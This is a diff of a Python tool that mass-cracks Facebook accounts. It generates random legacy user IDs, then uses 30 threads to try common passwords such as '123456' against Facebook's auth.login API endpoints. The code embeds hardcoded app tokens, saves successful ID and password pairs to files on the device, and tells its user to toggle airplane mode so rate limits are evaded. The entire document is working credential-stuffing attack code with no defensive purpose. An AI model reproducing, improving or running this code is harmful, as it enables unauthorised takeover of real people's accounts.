-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
-    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
-    linex()
-    prefix = '1000004'
-    for _ in range(int(limit)):
-        suffix = ''.join(random.choices('0123456789', k=8))
-        uid = prefix + suffix
-        user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
-    linex()
-    meth = safe_input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for uid in user:
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
-
+        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')): return '2010'
+        if uid.startswith(('100002', '100003')): return '2011'
+        if uid.startswith('100004'): return '2012'
+        if uid.startswith(('100005', '100006')): return '2013'
+        if uid.startswith(('100007', '100008')): return '2014'
+        if uid.startswith('100009'): return '2015'
+        if uid.startswith('10001'): return '2016'
+        if uid.startswith('10002'): return '2017'
+        if uid.startswith('10003'): return '2018'
+        if uid.startswith('10004'): return '2019'
+        if uid.startswith('10005'): return '2020'
+        if uid.startswith('10006'): return '2021'
+        if uid.startswith('10009'): return '2023'
+        if uid.startswith(('10007', '10008')): return '2022'
+    elif len(uid) in (9, 10): return '2008'
+    elif len(uid) == 8: return '2007'
+    elif len(uid) == 7: return '2006'
+    elif len(uid) == 14 and uid.startswith('61'): return '2024'
+    return ''
 
 def login_1(uid):
-    """
-    Login attempt method 1.
-    """
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
-        sys.stdout.flush()
+        with console.lock:
+            ts = datetime.now().strftime('%H:%M:%S')
+            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold cyan]WEBT 👑[/bold cyan] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red] ")
+            sys.stdout.write(msg); sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'cpl': 'true',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'device_based_login_password',
-                'error_detail_type': 'button_with_disabled',
-                'source': 'device_based_login',
-                'email': str(uid),
-                'password': str(pw),
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'generate_session_cookies': '1',
-                'meta_inf_fbmeta': '',
-                'advertiser_id': str(uuid.uuid4()),
-                'currently_logged_in_userid': '0',
-                'locale': 'en_US',
-                'client_country_code': 'US',
-                'method': 'auth.login',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key': '882a8490361da98702bf97a021ddc14d'
+                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
+                'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': str(uid),
+                'password': str(pw), 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US',
+                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'
             }
             headers = {
-                'User-Agent': window1(),
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': '25227',
-                'X-FB-SIM-HNI': '29752',
-                'X-FB-Connection-Type': 'MOBILE.LTE',
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
-                'x-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
+                'User-Agent': window1(), 'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True',
                 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/AHB-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                oks.append(uid)
-                break
+                console.log(f"[bold green]WEBT-OK[/bold green] [white]{uid} | {pw} | {creationyear(uid)}[/white]")
+                open('/sdcard/WEBT-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid); break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/AHB-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                oks.append(uid)
-                break
+                console.log(f"[bold yellow]WEBT-CP[/bold yellow] [dim]{uid} | {pw}[/dim]")
+                open('/sdcard/WEBT-CP.txt', 'a').write(f"{uid}|{pw}\n")
+                cps.append(uid); break
         loop += 1
-    except Exception:
-        time.sleep(5)
-
+    except: pass
 
 def login_2(uid):
-    """
-    Login attempt method 2.
-    """
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
-    
-    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
-        try:
+    global loop
+    try:
+        with console.lock:
+            ts = datetime.now().strftime('%H:%M:%S')
+            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold cyan]WEBT 👑[/bold cyan] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red] ")
+            sys.stdout.write(msg); sys.stdout.flush()
+        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
             with requests.Session() as session:
-                headers = {
-                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
-                    'x-fb-sim-hni': str(rr(20000, 40000)),
-                    'x-fb-net-hni': str(rr(20000, 40000)),
-                    'x-fb-connection-quality': 'EXCELLENT',
-                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-                    'user-agent': window1(),
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'x-fb-http-engine': 'Liger'
-                }
-                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                headers = {'user-agent': window1(), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/AHB-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-                elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/AHB-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-        except Exception as e:
-            pass
-    loop += 1
+                    console.log(f"[bold green]WEBT-OK[/bold green] [white]{uid} | {pw} | {creationyear(uid)}[/white]")
+                    open('/sdcard/WEBT-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid); break
+                elif 'checkpoint' in str(po):
+                    console.log(f"[bold yellow]WEBT-CP[/bold yellow] [dim]{uid} | {pw}[/dim]")
+                    open('/sdcard/WEBT-CP.txt', 'a').write(f"{uid}|{pw}\n")
+                    cps.append(uid); break
+        loop += 1
+    except: pass
 
-def check_for_updates():
-    print("Checking for updates...")
-    try:
-        # Check for updates by temporarily cloning to a temp folder
-        # This allows users without push access to get updates
-        temp_dir = os.path.join(SCRIPT_DIR, "temp_update")
-        if os.path.exists(temp_dir):
-            import shutil
-            shutil.rmtree(temp_dir)
-            
-        subprocess.run(["git", "clone", "https://github.com/cybervaultke/AHB.git", temp_dir], check=True, capture_output=True)
-        
-        # Simple version comparison (compare modified time of a key file or similar logic)
-        # For now, just compare directory existence is not enough.
-        # Let's keep it simple: if clone succeeds and directory is newer, update.
-        # Or just tell the user to re-clone.
-        # Actually, best approach for user without push access:
-        # Notify user to re-clone manually if they suspect an update, or script does it.
-        
-        print("Update check completed. For users without push access, please re-run 'git clone' if a new version is announced.")
-    except Exception as e:
-        print(f"Update check failed: {e}. Continuing anyway.")
+def old_clone_menu():
+    while True:
+        header()
+        console.print("\n [bold yellow]CLONING MENU[/bold yellow]")
+        linex()
+        console.print(f" ◆ [bold yellow]01[/bold yellow]  ALL SERIES          {'2009-2014 IDs':>20}")
+        console.print(f" ◆ [bold yellow]02[/bold yellow]  100003/4 SERIES     {'2010-2014 IDs':>20}")
+        console.print(f" ◆ [bold yellow]03[/bold yellow]  2009 SERIES         {'Legacy IDs':>20}")
+        console.print("\n [bold cyan]NAVIGATION[/bold cyan]")
+        linex()
+        console.print(f" ◆ [bold yellow]00[/bold yellow]  Back to Main        {'BACK':>20}")
+        linex()
+        choice = safe_input("\n [?] Selection: ")
+        if choice == '1': cloning_process("ALL", "10000")
+        elif choice == '2': cloning_process("100003/4", ["100003", "100004"])
+        elif choice == '3': cloning_process("2009", "1000004")
+        elif choice == '0': break
+        else: show_error("Invalid option")
+
+def cloning_process(name, prefixes):
+    header()
+    console.print("\n [bold yellow]CLONING SETUP[/bold yellow]")
+    linex()
+    console.print(f" ▎ [bold cyan]category[/bold cyan]    [white]{name} SERIES[/white]")
+    console.print(f" ▎ [bold cyan]prefixes[/bold cyan]    [white]{str(prefixes)}[/white]")
+    linex()
+    limit = safe_input(" [?] ID Limit (max 5000) : ")
+    try: lim = int(limit)
+    except: show_error("Invalid limit!"); return
+    console.print("\n [bold yellow]METHOD SELECTION[/bold yellow]")
+    linex()
+    console.print(f" ◆ [bold yellow]A[/bold yellow]  Method 1            {'Graph API (Fast)':>20}")
+    console.print(f" ◆ [bold yellow]B[/bold yellow]  Method 2            {'Legacy API (Stable)':>20}")
+    linex()
+    meth = safe_input(" [?] Selection (A/B) : ").upper()
+    user = []
+    for _ in range(lim):
+        if isinstance(prefixes, list): uid = random.choice(prefixes) + ''.join(random.choices('0123456789', k=9))
+        elif name == "ALL": uid = prefixes + str(random.randint(1000000000, 4999999998))
+        else: uid = prefixes + ''.join(random.choices('0123456789', k=8))
+        user.append(uid)
+    header()
+    console.print("\n [bold red]CRACKING STARTED[/bold red]")
+    linex()
+    console.print(f" ▎ [bold cyan]total IDs[/bold cyan]    [bold yellow]{len(user)}[/bold yellow]")
+    console.print(f" ▎ [bold cyan]method[/bold cyan]       [bold green]METHOD {meth}[/bold green]")
+    console.print("\n [bold red]USE AIRPLANE MODE EVERY 5 MINUTES![/bold red]")
+    linex()
+    with tred(max_workers=30) as pool:
+        for uid in user:
+            if meth == 'A': pool.submit(login_1, uid)
+            else: pool.submit(login_2, uid)
+    console.print("\n")
+    linex()
+    console.print("\n [bold green]CRACKING COMPLETED[/bold green]")
+    linex()
+    console.print(f" ▎ [bold green]successful[/bold green]    [bold white]{len(oks)}[/bold white]")
+    console.print(f" ▎ [bold yellow]checkpoint[/bold yellow]    [bold white]{len(cps)}[/bold white]")
+    console.print("\n [bold cyan]DATA SAVED[/bold cyan]")
+    linex()
+    console.print(" Results saved to: [cyan]/sdcard/WEBT-OK.txt[/cyan]")
+    linex()
+    safe_input(" Press Enter to return to menu...")
 
 if __name__ == '__main__':
-    check_for_updates()
-    check_activation()
-    BNG_71_()
+    if check_activation():
+        while True:
+            old_clone_menu()
+            cont = safe_input(" Press Enter to return to menu or type /exit to quit: ")
+            if cont.strip().lower() == '/exit': break
